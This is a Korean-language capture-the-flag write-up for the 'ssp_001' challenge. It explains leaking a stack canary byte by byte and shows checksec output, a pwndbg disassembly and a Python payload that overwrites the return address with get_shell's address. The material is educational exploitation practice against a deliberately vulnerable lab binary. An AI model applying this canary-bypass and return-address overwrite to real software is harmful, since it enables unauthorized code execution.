# ☘️ ssp_001 <br>
목표: Canary 보호 기법 우회, get_shell 함수 실행 <br>

## 📄 분석 및 설계 <br>
- checksec 확인 <br>
```
$ checksec ssp_001
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
- Input <br>
box를 A로 채운 후, `P` 기능을 이용해 index를 하나씩 증가시키며 값을 확인 <br>
처음에는 box 범위(0~63)까지는 `0x41`이 나오고, 그 이후부터는 `0x00`이 나타남 <br>
단순히 `0x00`이 나온다고 canary라고 판단하지 않고,  
index를 계속 증가시키면서 `00 xx xx xx` 형태의 패턴 발견 <br>
여러 index를 확인한 결과, 해당 패턴이 나타나는 지점을 canary 시작 위치로 판단 <br>

- pwndbg 이용 분석 <br>
```asm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0804872b <+0>:     push   ebp
   0x0804872c <+1>:     mov    ebp,esp
   0x0804872e <+3>:     push   edi
   0x0804872f <+4>:     sub    esp,0x94
   0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
...
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
End of assembler dump.
```
name이 주소 [ebp-0x48], box의 주소 [ebp-0x88] 확인 <br>

## 💻 Exploit <br>
box의 idx를 0x80 ~ 0x84로 설정, ebp-0x8 ~ ebp-0x4사이 Canary 4byte (32bit arch) <br>

```asm
pwndbg> p get_shell
$3 = {<text variable, no debug info>} 0x80486b9 <get_shell>
```
```python
payload = b"A" * 0x40 + canary + b"A" * 4 + b"B" * 4 + p32(0x80486b9) 
```
get_shell의 주소 p32(0x80486b9) payload로 덮기 <br>


